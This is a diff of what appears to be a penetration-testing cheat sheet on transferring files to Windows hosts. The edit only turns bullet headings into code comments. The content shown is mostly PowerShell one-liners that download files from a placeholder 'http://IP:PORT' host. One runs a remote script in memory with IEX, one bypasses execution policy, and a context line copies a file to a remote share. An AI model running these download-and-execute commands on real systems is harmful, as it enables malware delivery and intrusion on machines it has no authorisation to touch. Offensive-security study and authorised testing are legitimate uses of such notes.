@@ -45,23 +45,22 @@ copy FILE \\IP\SHARE_NAME\OUTPUT
 
 ## PSH
 
-- **Download&Execute Without Saving**
 
 ```powershell
+# Download&Execute Without Saving
 powershell IEX (New-Object System.Net.WebClient).DownloadString('http://IP:PORT/FILE.ps1')
 ```
 
 <br/>
 
-- **`Interactive`**
 
 ```powershell
+# Interactive Terminal
 powershell -command (New-Object System.Net.WebClient).Downloadfile('http://IP:PORT/FILE.exe','FILE.exe')
 ```
 
-- **`Non Interactive`**
-
 ```powershell
+# Non Interactive Terminal
 echo $storageDir = $pwd > PSH.ps1
 echo $webclient = New-Object System.Net.WebClient >> PSH.ps1
 echo $url = "http://IP:PORT/FILE.exe" >> PSH.ps1
@@ -72,17 +71,17 @@ powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File PSH.
 
 <br/>
 
-- **`WebRequest`**
 
 ```powershell
+# WebRequest
 $source = 'http://IP:PORT/FILE.exe'
 $destination = 'OUTPUT.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
 ```
 
-- **`RestMethod`**
 
 ```powershell
+# RestMethod
 $source = 'http://IP:PORT/FILE.exe'
 $destination = 'FILE.exe'
 Invoke-RestMethod -Uri $source -OutFile $destination
